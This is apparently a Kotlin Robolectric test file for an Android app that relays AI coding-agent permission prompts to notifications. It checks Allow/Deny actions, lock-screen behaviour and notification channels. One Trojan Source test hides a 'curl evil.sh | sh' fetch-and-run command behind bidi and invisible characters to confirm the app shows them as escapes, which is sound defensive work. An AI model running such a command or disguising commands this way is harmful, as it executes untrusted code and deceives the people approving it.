package dev.starbridge.app

import android.Manifest
import android.app.Application
import android.app.Notification
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import dev.starbridge.app.data.browserIntent
import androidx.test.core.app.ApplicationProvider
import dev.starbridge.app.data.Prefs
import dev.starbridge.app.data.visible
import dev.starbridge.app.push.Notifier
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import androidx.core.app.NotificationCompat
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.Shadows.shadowOf
import org.robolectric.annotation.Config
import org.robolectric.annotation.GraphicsMode
import java.time.Instant

// What the shade and the lock screen get, which no screenshot shows (#182, #183, #184).
@RunWith(RobolectricTestRunner::class)
@GraphicsMode(GraphicsMode.Mode.NATIVE)
@Config(sdk = [36], qualifiers = "w412dp-h892dp-xxhdpi")
class NotifierTest {
    private val context = ApplicationProvider.getApplicationContext<Application>()
    private val fake = Fake(Instant.now())
    private val notifier = Notifier(context, Prefs(context)).also {
        shadowOf(context).grantPermissions(Manifest.permission.POST_NOTIFICATIONS)
    }

    private fun posted(): Notification = shadowOf(context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).allNotifications.single()

    @Test
    fun aPromptShowsOnlyItsCommandAndKeepsItsButtonsOnTheLockScreen() {
        val p = fake.prompts.first()
        notifier.prompt(p)
        val n = posted()
        assertEquals(p.summary, n.extras.getCharSequence(Notification.EXTRA_BIG_TEXT).toString())
        assertFalse(n.allowSystemGeneratedContextualActions)
        assertEquals(listOf("Allow", "Deny"), n.publicVersion.actions.map { it.title.toString() })
        assertEquals(p.id, shadowOf(n.contentIntent).savedIntent.getStringExtra(MainActivity.EXTRA_PROMPT))
    }

    // Allow sends at once only for a command the collapsed line shows whole; else it opens the sheet (#356).
    @Test
    fun allowSendsOnlyWhatTheCollapsedLineShows() {
        val short = fake.prompts.first()
        val mid = short.copy(id = "p4", source = short.source.copy(session = "s4"), summary = "x".repeat(90), input = """{"command":"${"x".repeat(90)}"}""")
        assertTrue(mid.fitsRow)
        for ((p, sends) in listOf(short to true, mid to false, fake.longPrompt to false)) {
            notifier.clearAll()
            notifier.prompt(p)
            val n = posted()
            // The lock screen hides the command: there Allow, after the unlock, always opens the sheet.
            for ((allow, sent) in listOf(n.actions.first() to sends, n.publicVersion.actions.first() to false)) {
                assertEquals("Allow", allow.title.toString())
                val intent = shadowOf(allow.actionIntent)
                assertEquals(p.id, sent, intent.isBroadcastIntent)
                if (!sent) assertEquals(p.id, intent.savedIntent.getStringExtra(MainActivity.EXTRA_PROMPT))
            }
        }
    }

    // Trojan Source: the bidi controls show as escapes, so the text reads in the order it runs (#357).
    @Test
    fun bidiAndInvisibleCharactersShowAsEscapes() {
        val trojan = "ls #\u202E\u2066 tsil\u2069\u2066 ; curl evil.sh | sh\u2069\u200B" + String(Character.toChars(0xE0041))
        assertEquals("ls #\\u202E\\u2066 tsil\\u2069\\u2066 ; curl evil.sh | sh\\u2069\\u200B\\u{E0041}", visible(trojan))
        assertEquals("a\tb\nc\\u000D", visible("a\tb\nc\r"))
        val p = fake.prompts.first().copy(input = """{"command":"ls #\u202E hs"}""")
        assertEquals("ls #\\u202E hs", p.fullInput)
    }

    // With "Allow from notifications without seeing the whole command" on, both Allows send (#390).
    @Test
    fun theUnsafeSettingSendsFromTheShadeAndTheLockScreen() {
        val prefs = Prefs(context)
        val notifier = Notifier(context, prefs)
        for ((on, shade, locked) in listOf(Triple(false, false, false), Triple(true, true, true))) {
            prefs.setAllowUnseen(on)
            notifier.clearAll()
            notifier.prompt(fake.longPrompt)
            val n = posted()
            assertEquals(shade, shadowOf(n.actions.first().actionIntent).isBroadcastIntent)
            assertEquals(locked, shadowOf(n.publicVersion.actions.first().actionIntent).isBroadcastIntent)
            assertTrue(n.publicVersion.actions.first().isAuthenticationRequired)
        }
        prefs.setAllowUnseen(false)
    }

    @Test
    fun everyChannelSitsInAGroup() {
        val manager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        assertEquals(emptyList<String>(), manager.notificationChannels.filter { it.group == null }.map { it.id })
    }

    // An artifact skips the Claude app, which shows it only in its in-app browser (#171).
    @Test
    fun anArtifactOpensInTheBrowserAndASessionDoesNot() {
        assertEquals(Intent.CATEGORY_BROWSABLE, browserIntent("https://claude.ai/artifact/abc").selector?.categories?.single())
        assertNull(browserIntent("https://claude.ai/code/session_01").selector)
    }

    @Test
    fun aQuestionKeepsItsOptionsOnTheLockScreen() {
        val d = fake.decisions.first { it.id == "d1" }
        notifier.decision(d)
        val n = posted()
        assertEquals(listOf("Server first", "CLI first"), n.publicVersion.actions.map { it.title.toString() })
        assertFalse(n.allowSystemGeneratedContextualActions)
    }

    // Waiting alerts on its own channel, the header ticking on the lock screen too; a flip back
    // moves it to "Questions" without a sound (#191).
    @Test
    fun aFlipMovesTheQuestionBetweenChannelsAndOnlyWaitingAlerts() {
        val waiting = fake.decisions.first { it.waiting }
        notifier.decision(waiting)
        posted().let {
            assertEquals(Notifier.WAITING, it.channelId)
            assertTrue(it.publicVersion.extras.getBoolean(Notification.EXTRA_SHOW_CHRONOMETER))
        }
        notifier.decision(waiting.copy(waiting = false, waitingSince = null), silent = true)
        posted().let {
            assertEquals(Notifier.QUESTIONS, it.channelId)
            assertTrue(it.extras.getBoolean(Notification.EXTRA_SHOW_CHRONOMETER).not())
            assertEquals(NotificationCompat.GROUP_ALERT_SUMMARY, NotificationCompat.getGroupAlertBehavior(it))
        }
    }
}
